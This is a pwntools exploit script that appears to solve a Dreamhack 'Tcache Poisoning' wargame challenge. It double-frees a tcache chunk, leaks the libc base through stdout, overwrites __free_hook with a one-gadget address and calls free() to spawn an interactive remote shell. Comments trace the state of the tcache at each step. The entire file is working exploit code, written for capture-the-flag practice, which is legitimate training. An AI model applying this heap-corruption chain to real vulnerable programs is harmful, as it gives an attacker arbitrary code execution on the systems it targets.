from pwn import *

port = 23778
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Tcache Poisoning/problem/tcache_poison")
lib = ELF("./Tcache Poisoning/problem/libc-2.27.so")

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
  rem.sendlineafter(b'Edit\n', b'1')
  rem.sendlineafter(b':', str(size).encode())
  rem.sendafter(b':', data)

def free():
  rem.sendlineafter(b'Edit\n', b'2')

def print_chunk():
  rem.sendlineafter(b'Edit\n', b'3')

def edit(data):
  rem.sendlineafter(b'Edit\n', b'4')
  rem.sendafter(b':', data)

# Initial tcache[0x40] is empty.
# tcache[0x40]: Empty

# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
alloc(0x40, b'dreamhack')
free()

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A -> ...
edit(b'B'*8 + b'\x00')
free()

# Append address of `stdout` to tcache[0x40]
# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = elf.symbols['stdout']
alloc(0x40, p64(addr_stdout))

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x40, b'BBBBBBBB')

# tcache[0x40]: _IO_2_1_stdout_ -> ...
_io_2_1_stdout_lsb = p64(lib.symbols['_IO_2_1_stdout_'])[0:1] # least significant byte of _IO_2_1_stdout_
alloc(0x40, _io_2_1_stdout_lsb) # allocated at `stdout`

print_chunk()
rem.recvuntil(b'Content: ')
stdout = u64(rem.recv(6).ljust(8, b'\x00'))
lb = stdout - lib.symbols['_IO_2_1_stdout_']
fh = lb + lib.symbols['__free_hook']
og = lb + 0x4f432

slog('libc_base', lb)
slog('free_hook', fh)
slog('one_gadget', og)

# Overwrite the `__free_hook` with the address of one-gadget

# Initial tcache[0x50] is empty.
# tcache[0x50]: Empty

# tcache[0x50]: chunk B
alloc(0x50, b'dreamhack') # chunk B
free()

# tcache[0x50]: chunk B -> chunk B -> ...
edit(b'C'*8 + b'\x00')
free()

# tcache[0x50]: chunk B -> __free_hook
alloc(0x50, p64(fh))

# tcache[0x50]: __free_hook
alloc(0x50, b'D'*8)

# __free_hook = the address of one-gadget
alloc(0x50, p64(og))

# Call `free()` to get shell
free()

rem.interactive()
